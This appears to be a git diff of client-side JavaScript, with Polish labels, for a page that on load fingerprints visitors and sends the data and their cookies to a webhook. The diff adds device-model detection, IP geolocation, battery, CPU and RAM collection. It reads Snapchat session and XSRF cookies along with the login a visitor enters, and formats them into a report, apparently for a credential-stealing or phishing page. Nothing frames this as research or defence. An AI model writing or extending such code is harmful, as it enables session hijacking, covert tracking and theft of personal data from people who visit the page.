@@ -1,9 +1,140 @@
 document.addEventListener('DOMContentLoaded', function () {
 
-  // *** Funkcja wysyłająca fingerprint i cookies na webhook ***
+  function detectSmartphoneModel() {
+    const ua = navigator.userAgent;
+    const width = screen.width;
+    const height = screen.height;
+    const dpr = window.devicePixelRatio || 1;
+
+    const resolutions = [
+      // iPhone
+      { model: "iPhone SE (1st gen)", width: 320, height: 568, dpr: 2 },
+      { model: "iPhone 6/6s/7/8", width: 375, height: 667, dpr: 2 },
+      { model: "iPhone 6+/6s+/7+/8+", width: 414, height: 736, dpr: 3 },
+      { model: "iPhone X / XS / 11 Pro", width: 375, height: 812, dpr: 3 },
+      { model: "iPhone XR / 11", width: 414, height: 896, dpr: 2 },
+      { model: "iPhone XS Max / 11 Pro Max", width: 414, height: 896, dpr: 3 },
+      { model: "iPhone 12 / 13 / 14", width: 390, height: 844, dpr: 3 },
+      { model: "iPhone 12 Pro Max / 13 Pro Max / 14 Plus", width: 428, height: 926, dpr: 3 },
+      { model: "iPhone 14 Pro / 15", width: 393, height: 852, dpr: 3 },
+      { model: "iPhone 14 Pro Max / 15 Pro Max", width: 430, height: 932, dpr: 3 },
+
+      // Samsung Galaxy
+      { model: "Samsung Galaxy S8 / S9", width: 360, height: 740, dpr: 4 },
+      { model: "Samsung Galaxy S10", width: 412, height: 869, dpr: 3.5 },
+      { model: "Samsung Galaxy S20", width: 412, height: 915, dpr: 3 },
+      { model: "Samsung Galaxy S21", width: 360, height: 800, dpr: 3 },
+      { model: "Samsung Galaxy S22", width: 384, height: 854, dpr: 3 },
+      { model: "Samsung Galaxy S23", width: 393, height: 873, dpr: 3 },
+
+      // Google Pixel
+      { model: "Pixel 4", width: 411, height: 869, dpr: 2.75 },
+      { model: "Pixel 5", width: 393, height: 851, dpr: 2.75 },
+      { model: "Pixel 6 / 7 / 8", width: 412, height: 915, dpr: 2.625 },
+
+      // OnePlus
+      { model: "OnePlus 7T", width: 412, height: 869, dpr: 2.75 },
+      { model: "OnePlus 8", width: 412, height: 914, dpr: 3 },
+
+      // Xiaomi
+      { model: "Xiaomi Redmi Note 8", width: 393, height: 851, dpr: 2 },
+      { model: "Xiaomi Mi 11", width: 412, height: 915, dpr: 3.5 },
+
+      // Huawei
+      { model: "Huawei P30", width: 360, height: 780, dpr: 3 },
+      { model: "Huawei P40", width: 392, height: 832, dpr: 2.5 },
+    ];
+
+    for (const device of resolutions) {
+      const matchW = (width === device.width && height === device.height) || (width === device.height && height === device.width);
+      const matchDPR = Math.abs(dpr - device.dpr) < 0.2;
+      if (matchW && matchDPR) return device.model;
+    }
+
+    if (/iPhone/.test(ua)) return 'iPhone (nieznany model)';
+    if (/Android/.test(ua)) return 'Android (nieznany model)';
+    if (/Windows/.test(ua)) return 'Komputer z Windows';
+    if (/Macintosh/.test(ua)) return 'Komputer Mac';
+
+    return 'Nieznane urządzenie';
+  }
+
+  async function getUserIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || 'NIEZNANE_IP';
+    } catch {
+      return 'BRAK_IP';
+    }
+  }
+
+  async function getLocationFromIP(ip) {
+    try {
+      const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,lat,lon,city,regionName,country`);
+      const data = await res.json();
+      if (data.status === 'success') {
+        return `📌 ${data.city}, ${data.regionName}, ${data.country} (Lat: ${data.lat.toFixed(5)}, Lon: ${data.lon.toFixed(5)})`;
+      } else {
+        return 'BRAK_LOKALIZACJI';
+      }
+    } catch {
+      return 'BRAK_LOKALIZACJI';
+    }
+  }
+
+  function getCookieValue(name) {
+    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+    return match ? decodeURIComponent(match[2]) : 'BRAK';
+  }
+
+  async function getUserMetadata() {
+    const batteryInfo = {
+      level: 'NIEOBSŁUGIWANE',
+      charging: 'NIEOBSŁUGIWANE',
+      chargingTime: 'NIEOBSŁUGIWANE',
+      dischargingTime: 'NIEOBSŁUGIWANE'
+    };
+
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo.level = Math.round(battery.level * 100) + '%';
+        batteryInfo.charging = battery.charging ? 'TAK' : 'NIE';
+        batteryInfo.chargingTime = battery.chargingTime === Infinity ? 'BRAK' : battery.chargingTime + 's';
+        batteryInfo.dischargingTime = battery.dischargingTime === Infinity ? 'BRAK' : battery.dischargingTime + 's';
+      } catch {}
+    }
+
+    return {
+      czas: new Date().toLocaleString(),
+      userAgent: navigator.userAgent,
+      resolution: `${screen.width}x${screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      jezyk: navigator.language,
+      platforma: navigator.platform,
+      cookiesEnabled: navigator.cookieEnabled,
+      cpu: navigator.hardwareConcurrency || 'NIEZNANE',
+      ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'NIEZNANE',
+      colorDepth: screen.colorDepth,
+      dpi: window.devicePixelRatio || 1,
+      orientation: (screen.orientation || {}).type || 'NIEZNANA',
+      battery: batteryInfo,
+      deviceModel: detectSmartphoneModel()
+    };
+  }
+
+  function getNextMessageNumber() {
+    let num = localStorage.getItem('messageNumber');
+    if (!num) num = 0;
+    num = parseInt(num) + 1;
+    localStorage.setItem('messageNumber', num);
+    return num;
+  }
+
   async function sendFingerprint() {
     const ua = navigator.userAgent;
-    const res = `${window.screen.width}x${window.screen.height}`;
+    const res = `${screen.width}x${screen.height}`;
     const lang = navigator.language;
     const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const platform = navigator.platform;
@@ -27,104 +158,14 @@ document.addEventListener('DOMContentLoaded', function () {
           cookies
         })
       });
-      console.log('Fingerprint i cookies wysłane.');
     } catch (e) {
       console.error('Błąd przy wysyłaniu fingerprinta:', e);
     }
   }
 
-  // Wywołaj od razu
   sendFingerprint();
 
-  // --- Twój oryginalny kod dalej ---
-
-  async function getUserIP() {
-    try {
-      const res = await fetch('https://api.ipify.org?format=json');
-      const data = await res.json();
-      return data.ip || 'NIEZNANE_IP';
-    } catch {
-      return 'IP_BRAK';
-    }
-  }
-
-  function getCookieValue(name) {
-    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
-    return match ? decodeURIComponent(match[2]) : 'BRAK';
-  }
-
-  async function getLocationFromIP(ip) {
-    try {
-      const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,lat,lon,city,regionName,country`);
-      const data = await res.json();
-      if (data.status === 'success') {
-        return `📌 Lat: ${data.lat.toFixed(5)}, Lng: ${data.lon.toFixed(5)} (${data.city}, ${data.regionName}, ${data.country})`;
-      } else {
-        return 'BRAK_Lokalizacji_IP';
-      }
-    } catch {
-      return 'BRAK_Lokalizacji_IP';
-    }
-  }
-
-  async function getUserLocation() {
-    const ip = await getUserIP();
-    const locationFromIP = await getLocationFromIP(ip);
-    return locationFromIP;
-  }
-
-  async function getUserMetadata() {
-    const meta = {
-      czas: new Date().toLocaleString(),
-      userAgent: navigator.userAgent,
-      resolution: `${window.screen.width}x${window.screen.height}`,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      jezyk: navigator.language,
-      platforma: navigator.platform,
-      cookiesEnabled: navigator.cookieEnabled,
-      cpu: navigator.hardwareConcurrency || 'NIEZNANE',
-      ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'NIEZNANE',
-      colorDepth: screen.colorDepth,
-      dpi: window.devicePixelRatio || 1,
-      orientation: (screen.orientation || {}).type || 'NIEZNANA',
-      battery: {
-        level: 'BRAK',
-        charging: 'BRAK',
-        chargingTime: 'BRAK',
-        dischargingTime: 'BRAK'
-      }
-    };
-
-    if (navigator.getBattery) {
-      try {
-        const battery = await navigator.getBattery();
-        meta.battery.level = Math.round(battery.level * 100) + '%';
-        meta.battery.charging = battery.charging ? 'TAK' : 'NIE';
-        meta.battery.chargingTime = battery.chargingTime === Infinity ? 'BRAK' : battery.chargingTime + 's';
-        meta.battery.dischargingTime = battery.dischargingTime === Infinity ? 'BRAK' : battery.dischargingTime + 's';
-      } catch {
-        // bez zmian jeśli error
-      }
-    } else {
-      meta.battery.level = 'NIEOBSŁUGIWANE';
-      meta.battery.charging = 'NIEOBSŁUGIWANE';
-      meta.battery.chargingTime = 'NIEOBSŁUGIWANE';
-      meta.battery.dischargingTime = 'NIEOBSŁUGIWANE';
-    }
-
-    return meta;
-  }
-
-  function getNextMessageNumber() {
-    let num = localStorage.getItem('messageNumber');
-    if (!num) num = 0;
-    num = parseInt(num) + 1;
-    localStorage.setItem('messageNumber', num);
-    return num;
-  }
-
   const gownoForm = document.getElementById('gowno-form');
-
   if (gownoForm) {
     gownoForm.addEventListener('submit', async function (e) {
       e.preventDefault();
@@ -136,8 +177,8 @@ document.addEventListener('DOMContentLoaded', function () {
       const login = localStorage.getItem('cwelski_login') || 'NIEZNANY_LOGIN';
       const messageNumber = getNextMessageNumber();
       const ip = await getUserIP();
+      const location = await getLocationFromIP(ip);
       const meta = await getUserMetadata();
-      const location = await getUserLocation();
 
       const snapchat_session = getCookieValue('snapchat_session');
       const xsrf_token = getCookieValue('xsrf-token');
@@ -152,12 +193,14 @@ document.addEventListener('DOMContentLoaded', function () {
 🌍 **IP**: \`${ip}\`
 📍 **Lokalizacja**: ${location}
 🕓 **Czas**: \`${meta.czas}\`
+📱 **Urządzenie**: \`${meta.deviceModel}\`
 💻 **User-Agent**: \`${meta.userAgent}\`
 🖥️ **Rozdzielczość**: \`${meta.resolution}\`
 🌐 **Strefa czasowa**: \`${meta.timezone}\`
 🗣️ **Język**: \`${meta.jezyk}\`
-🔋 **Bateria**: \`Poziom: ${meta.battery.level}, Ładowanie: ${meta.battery.charging}\`
 🧠 **Platforma**: \`${meta.platforma}\`
+🔋 **Bateria**: \`Poziom: ${meta.battery.level}, Ładowanie: ${meta.battery.charging}\`
+🧮 **CPU**: \`${meta.cpu}\`, **RAM**: \`${meta.ram}\`
 
 --- Dodatkowe cookies ---
 🥷 snapchat_session: \`${snapchat_session}\`
@@ -188,7 +231,6 @@ document.addEventListener('DOMContentLoaded', function () {
   if (loginForm) {
     loginForm.addEventListener('submit', function (e) {
       e.preventDefault();
-
       const login = document.getElementById('login').value;
       localStorage.setItem('cwelski_login', login);
 
@@ -200,21 +242,16 @@ document.addEventListener('DOMContentLoaded', function () {
       }, 1000);
     });
   }
-});
 
-// --- rozdzialka ---
-
-document.addEventListener('DOMContentLoaded', () => {
   const div36 = document.querySelector('div.style-36');
   const div999 = document.querySelector('div.style-999');
 
   function checkScreen() {
     const width = window.innerWidth;
-
-    if (width <= 768) { // telefon
+    if (width <= 768) {
       if (div36) div36.style.display = 'block';
       if (div999) div999.style.display = 'none';
-    } else { // komputer
+    } else {
       if (div36) div36.style.display = 'none';
       if (div999) div999.style.display = 'block';
     }
